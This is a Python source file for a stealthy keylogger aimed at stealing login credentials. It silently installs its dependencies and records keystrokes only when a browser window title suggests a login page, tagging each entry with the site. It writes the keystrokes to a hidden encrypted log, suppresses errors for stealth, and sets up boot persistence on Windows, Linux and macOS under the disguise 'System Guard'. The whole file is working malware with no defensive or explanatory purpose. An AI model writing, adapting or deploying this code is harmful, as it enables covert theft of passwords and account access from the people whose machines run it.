import os
import sys
import time
import subprocess
import platform

# === Install Dependencies Automatically ===
def install_dependencies():
    try:
        import pip
    except ImportError:
        print("pip not found. Exiting.")
        sys.exit()

    required = ['pynput', 'cryptography', 'pywin32']
    for package in required:
        subprocess.call([sys.executable, "-m", "pip", "install", "--quiet", package])

install_dependencies()

# === Imports After Installation ===
from pynput import keyboard
from cryptography.fernet import Fernet
import win32gui  # Only works on Windows
import ctypes

# === Generate or Read Key ===
key_file = os.path.expanduser("~/.sys_key.key")
if not os.path.exists(key_file):
    with open(key_file, "wb") as kf:
        kf.write(Fernet.generate_key())

with open(key_file, "rb") as kf:
    key = kf.read()

cipher = Fernet(key)

# === Create Hidden Log File ===
log_file = os.path.expanduser("~/.sys_log.enc")
if not os.path.exists(log_file):
    with open(log_file, "ab") as f:
        f.write(cipher.encrypt(f"Keylogger started at {time.ctime()}".encode()) + b'\n')
    # Hide the file on Windows
    if platform.system() == "Windows":
        ctypes.windll.kernel32.SetFileAttributesW(log_file, 2)

# === Get Active Window Title ===
def get_active_window_title():
    try:
        if platform.system() == "Windows":
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        else:
            return os.popen("osascript -e 'tell application \"System Events\" to get name of (processes where frontmost is true)'").read().strip()
    except Exception:
        return ""

# === Encrypt and Write Log ===
def write_log(data, context=""):
    try:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{timestamp}]" + (f" [{context}]" if context else "") + f": {data}"
        encrypted = cipher.encrypt(log_entry.encode())
        with open(log_file, "ab") as f:
            f.write(encrypted + b'\n')
    except Exception as e:
        pass  # Silent fail for stealth

# === Key Press Handler ===
def on_press(key):
    active_window = get_active_window_title()
    active_window_lower = active_window.lower()
    browsers = ["chrome", "firefox", "edge", "opera", "brave"]
    login_terms = ["login", "sign in", "signin", "log in", "username", "password", "account"]

    is_browser = any(browser in active_window_lower for browser in browsers)
    is_login_page = any(term in active_window_lower for term in login_terms)

    if is_browser and is_login_page:
        website = active_window.split(" - ")[0].split(" | ")[0].strip()

        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char, context=website)
        else:
            special_keys = {
                keyboard.Key.space: "[SPACE]",
                keyboard.Key.enter: "[ENTER]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.tab: "[TAB]",
            }
            readable = special_keys.get(key, f"[{key}]")
            write_log(readable, context=website)

# === Stop Logging with Escape ===
def on_release(key):
    if key == keyboard.Key.esc:
        return False

# === Auto-Start on Boot ===
def setup_autostart():
    script_path = os.path.abspath(sys.argv[0])
    if platform.system() == "Windows":
        import winreg as reg
        key = reg.HKEY_CURRENT_USER
        run_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with reg.OpenKey(key, run_key, 0, reg.KEY_SET_VALUE) as reg_key:
            reg.SetValueEx(reg_key, "WindowsSysGuard", 0, reg.REG_SZ, script_path)
    elif platform.system() == "Linux":
        autostart_path = os.path.expanduser("~/.config/autostart/sysguard.desktop")
        os.makedirs(os.path.dirname(autostart_path), exist_ok=True)
        with open(autostart_path, "w") as f:
            f.write(f"""[Desktop Entry]
Type=Application
Exec=python3 {script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
Name=System Guard
""")
    elif platform.system() == "Darwin":  # macOS
        plist_path = os.path.expanduser("~/Library/LaunchAgents/com.sysguard.plist")
        with open(plist_path, "w") as f:
            f.write(f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.sysguard</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
""")

setup_autostart()

# === Start Listener ===
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
